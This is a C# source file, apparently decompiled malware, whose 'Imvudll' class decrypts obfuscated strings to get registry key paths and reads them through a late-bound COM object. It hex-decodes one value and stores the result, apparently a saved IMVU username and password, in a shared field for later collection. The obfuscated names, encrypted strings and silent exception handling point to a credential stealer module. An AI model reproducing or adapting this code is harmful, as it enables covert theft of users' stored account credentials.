using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DAImvu
{
	public class Imvudll
	{
		public static void GTMYIm()
		{
			try
			{
				string hKey = LOOTCKC.IPNPIWT("iKarxr6DsLi/pI6vxcKyha3CwM6mz93O0aW3r7q1lbfb4MSyycfaxJwH", "False");
				string hKey2 = LOOTCKC.IPNPIWT("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7s765mbva0ta31tnjx6AD", "False");
				KVPXNIVH.LEQPV = LOOTCKC.IPNPIWT("XXiDinxdeIOKfF14j7qVlXiDinxdeIOKfF14g4p8Jg==", "False") + Environment.NewLine + LOOTCKC.IPNPIWT("jMXC1sSYv8KEkFcQ", "False") + RGRD4(hKey) + Environment.NewLine + LOOTCKC.IPNPIWT("aJSxuK6HpaJlcTgv", "False") + HXASCI2(RGRD4(hKey2));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				KVPXNIVH.LEQPV = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RGRD4(string hKey)
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(LOOTCKC.IPNPIWT("eZCrwaqSsXaiqYeptCc=", "False"), ""));
				object[] array = new object[1] { hKey };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string HXASCI2(string Text)
		{
			string result = default(string);
			try
			{
				object obj = null;
				object obj2 = default(object);
				object obj3 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
				{
					do
					{
						object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
						obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)LOOTCKC.IPNPIWT("XboR", "False"), obj4))))));
						obj2 = Operators.AddObject(obj2, (object)1);
					}
					while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
